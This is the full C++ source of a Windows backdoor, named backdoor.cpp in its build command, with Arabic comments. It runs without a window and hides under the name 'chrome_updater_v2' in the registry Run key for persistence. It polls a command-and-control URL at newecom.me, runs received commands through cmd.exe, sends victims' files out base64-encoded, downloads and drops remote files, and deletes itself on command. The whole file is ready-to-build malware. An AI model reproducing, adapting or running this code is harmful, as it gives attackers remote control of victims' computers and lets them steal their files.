#include <windows.h>
#include <wininet.h>
#include <iostream>
#include <string>
#include <sstream>
#include <fstream>
#include <thread>
#include <chrono>
#include <iomanip>
#include <algorithm>
#include <wincrypt.h>

#pragma comment(lib, "wininet.lib")
#pragma comment(lib, "advapi32.lib")
#pragma comment(lib, "crypt32.lib")

const std::string SERVER_URL = "https://newecom.me/gbna";
const std::string REGISTRY_KEY_PATH = "Software\\Microsoft\\Windows\\CurrentVersion\\Run";
const std::string VALUE_NAME = "chrome_updater_v2";

// دالة لإضافة الثبات عبر الريجستري
bool add_registry_persistence() {
    HKEY hKey;
    char path[MAX_PATH];
    GetModuleFileNameA(NULL, path, MAX_PATH);
    
    LONG result = RegOpenKeyExA(HKEY_CURRENT_USER, REGISTRY_KEY_PATH.c_str(), 0, KEY_WRITE, &hKey);
    if (result != ERROR_SUCCESS) {
        result = RegCreateKeyExA(HKEY_CURRENT_USER, REGISTRY_KEY_PATH.c_str(), 0, NULL,
                               REG_OPTION_NON_VOLATILE, KEY_WRITE, NULL, &hKey, NULL);
        if (result != ERROR_SUCCESS) {
            return false;
        }
    }
    
    result = RegSetValueExA(hKey, VALUE_NAME.c_str(), 0, REG_SZ, 
                           (const BYTE*)path, strlen(path) + 1);
    
    RegCloseKey(hKey);
    return (result == ERROR_SUCCESS);
}

// دالة لإزالة الثبات من الريجستري
bool remove_registry_persistence() {
    HKEY hKey;
    LONG result = RegOpenKeyExA(HKEY_CURRENT_USER, REGISTRY_KEY_PATH.c_str(), 0, KEY_WRITE, &hKey);
    if (result != ERROR_SUCCESS) {
        return false;
    }
    
    result = RegDeleteValueA(hKey, VALUE_NAME.c_str());
    RegCloseKey(hKey);
    return (result == ERROR_SUCCESS);
}

std::string execute_command(const std::string& cmd) {
    SECURITY_ATTRIBUTES sa;
    sa.nLength = sizeof(sa);
    sa.lpSecurityDescriptor = NULL;
    sa.bInheritHandle = TRUE;

    HANDLE hRead, hWrite;
    if (!CreatePipe(&hRead, &hWrite, &sa, 0)) {
        return "Error: Failed to create pipe";
    }

    STARTUPINFOA si = {0};
    PROCESS_INFORMATION pi = {0};
    si.cb = sizeof(si);
    si.dwFlags = STARTF_USESHOWWINDOW | STARTF_USESTDHANDLES;
    si.wShowWindow = SW_HIDE;
    si.hStdOutput = hWrite;
    si.hStdError = hWrite;

    std::string command = "cmd.exe /C " + cmd;
    if (!CreateProcessA(NULL, (LPSTR)command.c_str(), NULL, NULL, TRUE, 
                      CREATE_NO_WINDOW, NULL, NULL, &si, &pi)) {
        CloseHandle(hWrite);
        CloseHandle(hRead);
        return "Error: Failed to create process";
    }

    CloseHandle(hWrite);

    char buffer[4096];
    DWORD bytesRead;
    std::string result;
    while (ReadFile(hRead, buffer, sizeof(buffer), &bytesRead, NULL) && bytesRead > 0) {
        result.append(buffer, bytesRead);
    }

    CloseHandle(hRead);
    CloseHandle(pi.hProcess);
    CloseHandle(pi.hThread);

    return result;
}

std::string base64_encode(const std::string& input) {
    DWORD encoded_size = 0;
    CryptBinaryToStringA((const BYTE*)input.c_str(), input.length(),
                         CRYPT_STRING_BASE64 | CRYPT_STRING_NOCRLF,
                         NULL, &encoded_size);
    std::string output(encoded_size, '\0');
    CryptBinaryToStringA((const BYTE*)input.c_str(), input.length(),
                         CRYPT_STRING_BASE64 | CRYPT_STRING_NOCRLF,
                         &output[0], &encoded_size);
    output.resize(encoded_size);
    return output;
}

std::string url_encode(const std::string& value) {
    std::ostringstream escaped;
    escaped.fill('0');
    escaped << std::hex;
    for (const auto& c : value) {
        if (isalnum((unsigned char)c) || c == '-' || c == '_' || c == '.' || c == '~') {
            escaped << c;
        } else {
            escaped << '%' << std::setw(2) << std::uppercase << int((unsigned char)c);
        }
    }
    return escaped.str();
}

std::string read_file_binary(const std::string& filepath) {
    std::ifstream file(filepath, std::ios::binary);
    if (!file) return "";
    std::ostringstream ss;
    ss << file.rdbuf();
    return ss.str();
}

bool download_file_from_url(const std::string& url, const std::string& output_path) {
    HINTERNET hInternet = InternetOpenA("Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36", 
                                      INTERNET_OPEN_TYPE_PRECONFIG, NULL, NULL, 0);
    if (!hInternet) return false;

    HINTERNET hFile = InternetOpenUrlA(hInternet, url.c_str(), NULL, 0, 
                                      INTERNET_FLAG_RELOAD | INTERNET_FLAG_SECURE, 0);
    if (!hFile) {
        InternetCloseHandle(hInternet);
        return false;
    }

    std::ofstream out(output_path, std::ios::binary);
    if (!out.is_open()) {
        InternetCloseHandle(hFile);
        InternetCloseHandle(hInternet);
        return false;
    }

    char buffer[4096];
    DWORD bytesRead = 0;
    while (InternetReadFile(hFile, buffer, sizeof(buffer), &bytesRead) && bytesRead != 0) {
        out.write(buffer, bytesRead);
    }

    out.close();
    InternetCloseHandle(hFile);
    InternetCloseHandle(hInternet);
    return true;
}

std::string https_post_request(const std::string& url, const std::string& post_data) {
    HINTERNET hInternet = InternetOpenA("Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36", 
                                      INTERNET_OPEN_TYPE_PRECONFIG, NULL, NULL, 0);
    if (!hInternet) return "";

    URL_COMPONENTSA urlComp = {0};
    char hostName[256], urlPath[2048];
    urlComp.dwStructSize = sizeof(urlComp);
    urlComp.lpszHostName = hostName;
    urlComp.dwHostNameLength = sizeof(hostName);
    urlComp.lpszUrlPath = urlPath;
    urlComp.dwUrlPathLength = sizeof(urlPath);

    if (!InternetCrackUrlA(url.c_str(), 0, 0, &urlComp)) {
        InternetCloseHandle(hInternet);
        return "";
    }

    HINTERNET hConnect = InternetConnectA(hInternet, urlComp.lpszHostName, urlComp.nPort, 
                                         NULL, NULL, INTERNET_SERVICE_HTTP, 0, 0);
    if (!hConnect) {
        InternetCloseHandle(hInternet);
        return "";
    }

    HINTERNET hRequest = HttpOpenRequestA(
        hConnect, "POST", urlComp.lpszUrlPath, NULL, NULL, NULL,
        INTERNET_FLAG_SECURE | INTERNET_FLAG_RELOAD | INTERNET_FLAG_NO_CACHE_WRITE, 0);

    if (!hRequest) {
        InternetCloseHandle(hConnect);
        InternetCloseHandle(hInternet);
        return "";
    }

    std::string headers = "Content-Type: application/x-www-form-urlencoded\r\n";
    if (!HttpSendRequestA(hRequest, headers.c_str(), headers.length(),
                         (LPVOID)post_data.c_str(), post_data.length())) {
        InternetCloseHandle(hRequest);
        InternetCloseHandle(hConnect);
        InternetCloseHandle(hInternet);
        return "";
    }

    std::string response;
    char buffer[4096];
    DWORD bytesRead = 0;

    while (InternetReadFile(hRequest, buffer, sizeof(buffer), &bytesRead) && bytesRead > 0) {
        response.append(buffer, bytesRead);
    }

    InternetCloseHandle(hRequest);
    InternetCloseHandle(hConnect);
    InternetCloseHandle(hInternet);

    return response;
}

void self_delete() {
    remove_registry_persistence();
    
    char path[MAX_PATH];
    GetModuleFileNameA(NULL, path, MAX_PATH);
    
    std::ofstream bat("cleanup.bat");
    bat << "@echo off\n"
        << ":loop\n"
        << "del \"" << path << "\" >nul 2>&1\n"
        << "if exist \"" << path << "\" goto loop\n"
        << "del cleanup.bat\n";
    bat.close();

    ShellExecuteA(NULL, "open", "cleanup.bat", NULL, NULL, SW_HIDE);
    ExitProcess(0);
}

void main_loop() {
    std::string user_identity = execute_command("whoami");
    user_identity.erase(std::remove(user_identity.begin(), user_identity.end(), '\n'), user_identity.end());
    std::string last_command = "";
    std::string current_directory = "C:\\";
    int interval_seconds = 30;

    while (true) {
        try {
            std::string post_data = "user=" + url_encode(user_identity);
            std::string command = https_post_request(SERVER_URL, post_data);

            if (!command.empty() && command != last_command) {
                last_command = command;

                if (command == "terminate") {
                    https_post_request(SERVER_URL, "user=" + url_encode(user_identity) + "&result=" + url_encode(base64_encode("Terminating...")));
                    self_delete();
                } else if (command.rfind("cd ", 0) == 0) {
                    std::string new_path = command.substr(3);
                    if (SetCurrentDirectoryA(new_path.c_str())) {
                        char buffer[MAX_PATH];
                        GetCurrentDirectoryA(MAX_PATH, buffer);
                        current_directory = buffer;
                        https_post_request(SERVER_URL, "user=" + url_encode(user_identity) + "&result=" + url_encode(base64_encode("Changed directory to: " + current_directory)));
                    } else {
                        https_post_request(SERVER_URL, "user=" + url_encode(user_identity) + "&result=" + url_encode(base64_encode("Failed to change directory to: " + new_path)));
                    }
                } else if (command.rfind("download ", 0) == 0) {
                    std::string file_path = command.substr(9);
                    std::string content = read_file_binary(file_path);
                    if (content.empty()) {
                        https_post_request(SERVER_URL, "user=" + url_encode(user_identity) + "&result=" + url_encode(base64_encode("Failed to read file.")));
                    } else {
                        std::string encoded = base64_encode(content);
                        https_post_request(SERVER_URL, "user=" + url_encode(user_identity) + "&download=" + url_encode(base64_encode(file_path)) + "&data=" + url_encode(encoded));
                    }
                } else if (command.rfind("upload ", 0) == 0) {
                    std::string file_url = command.substr(7);
                    size_t sep = file_url.find('|');
                    if (sep != std::string::npos) {
                        std::string url = file_url.substr(0, sep);
                        std::string target_path = file_url.substr(sep + 1);
                        if (download_file_from_url(url, target_path)) {
                            https_post_request(SERVER_URL, "user=" + url_encode(user_identity) + "&result=" + url_encode(base64_encode("Downloaded file to: " + target_path)));
                        } else {
                            https_post_request(SERVER_URL, "user=" + url_encode(user_identity) + "&result=" + url_encode(base64_encode("Failed to download file from: " + url)));
                        }
                    } else {
                        https_post_request(SERVER_URL, "user=" + url_encode(user_identity) + "&result=" + url_encode(base64_encode("Invalid upload command format. Use: upload <url>|<target_path>")));
                    }
                } else if (command.rfind("set_interval ", 0) == 0) {
                    try {
                        int new_interval = std::stoi(command.substr(13));
                        if (new_interval > 0 && new_interval <= 3600) {
                            interval_seconds = new_interval;
                            https_post_request(SERVER_URL, "user=" + url_encode(user_identity) + "&result=" + url_encode(base64_encode("Interval set to " + std::to_string(interval_seconds) + " seconds")));
                        } else {
                            https_post_request(SERVER_URL, "user=" + url_encode(user_identity) + "&result=" + url_encode(base64_encode("Invalid interval. Use a value between 1 and 3600.")));
                        }
                    } catch (...) {
                        https_post_request(SERVER_URL, "user=" + url_encode(user_identity) + "&result=" + url_encode(base64_encode("Failed to parse interval.")));
                    }
                } else {
                    std::string result = execute_command(command);
                    if (result.empty()) result = "Wrong command or empty response";
                    https_post_request(SERVER_URL, "user=" + url_encode(user_identity) + "&result=" + url_encode(base64_encode(result)));
                }
            }

            std::this_thread::sleep_for(std::chrono::seconds(interval_seconds));
        } catch (...) {
            std::this_thread::sleep_for(std::chrono::seconds(interval_seconds));
        }
    }
}

int APIENTRY WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nCmdShow) {
    // منع ظهور أي نافذة
    FreeConsole();
    
    // منع تشغيل أكثر من نسخة واحدة
    HANDLE hMutex = CreateMutexA(NULL, TRUE, "Global\\WindowsUpdateServiceMutex");
    if (GetLastError() == ERROR_ALREADY_EXISTS) {
        return 0;
    }
    
    // إضافة الثبات عبر الريجستري
    add_registry_persistence();
    
    // بدء الحلقة الرئيسية
    main_loop();
    
    // تحرير الميوتكس (لن يتم تنفيذ هذا عادةً لأن main_loop لا تنتهي)
    ReleaseMutex(hMutex);
    CloseHandle(hMutex);
    
    return 0;
}

//g++ -static -static-libgcc -static-libstdc++ -mwindows -O2 -o chrome_updater_v2.exe backdoor.cpp -lwininet -ladvapi32 -lcrypt32
